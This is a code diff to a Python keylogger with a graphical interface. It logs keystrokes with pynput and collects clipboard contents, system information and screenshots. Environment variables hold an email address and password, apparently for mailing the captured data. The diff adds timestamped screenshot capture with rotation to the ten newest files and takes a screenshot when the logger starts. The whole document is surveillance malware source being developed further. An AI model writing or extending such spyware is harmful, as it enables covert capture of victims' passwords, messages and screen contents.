@@ -20,6 +20,9 @@ from customtkinter import CTk, CTkLabel, CTkFrame, CTkEntry, CTkButton, set_appe
 from dotenv import load_dotenv
 from pynput.keyboard import Listener
 
+import glob
+from datetime import datetime
+
 # Load environment variables
 load_dotenv()
 
@@ -30,14 +33,14 @@ logging.basicConfig(filename="data/key_log.txt", level=logging.DEBUG, format='%(
 keys_information = "data/key_log.txt"
 system_information = "data/systeminfo.txt"
 clipboard_information = "data/clipboard.txt"
-screenshot_information = "data/screenshot.png"
+SCREENSHOT_DIR="data/screenshots"
 
 # Retrieve email and password from environment variables
 email_address = os.getenv('email')
 password = os.getenv('pass')
 
 # Global variables for email sending
-toAddr = ""
+toAddr = "" 
 state = 0
 stopFlag = False
 
@@ -109,8 +112,37 @@ def copy_clipboard():
 
 # Function to take screenshot
 def screenshot():
+    os.makedirs(SCREENSHOT_DIR, exist_ok=True)
+
+    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+
+    screenshot_information = os.path.join(SCREENSHOT_DIR, f"screenshot_{timestamp}.png")
+
     im = ImageGrab.grab()
     im.save(screenshot_information)
+
+    print(f"Saved screenshot: {screenshot_information}")
+    limit_screenshots(SCREENSHOT_DIR, keep=10)
+
+
+
+def limit_screenshots(directory, keep=10):
+
+    """Delete old screenshots if more than 'keep' exist."""
+
+    screenshots = sorted(
+        glob.glob(os.path.join(directory, "*.png")),
+        key=os.path.getmtime
+    )
+
+    if len(screenshots) > keep:
+        for old_file in screenshots[:-keep]:
+            try:
+                os.remove(old_file)
+                print(f"Deleted old screenshot: {old_file}")
+            except Exception as e:
+                print(f"Error deleting {old_file}: {e}")
+
 
 
 # Global variables for key logging
@@ -146,6 +178,7 @@ def start_logger():
     count = 900
     listener.start()
     btnStr.set("Stop Keylogger")
+    screenshot()
     while True:
         print(count)
         if stopFlag:
